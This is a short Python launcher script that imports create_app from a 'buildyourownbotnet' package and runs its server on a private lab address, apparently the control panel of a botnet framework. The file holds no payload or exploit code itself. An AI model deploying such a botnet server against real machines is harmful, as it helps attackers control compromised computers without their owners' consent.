from buildyourownbotnet import create_app

if __name__ == '__main__':
	app = create_app(test=False)
	app.run(host='192.168.56.10', port=5000)
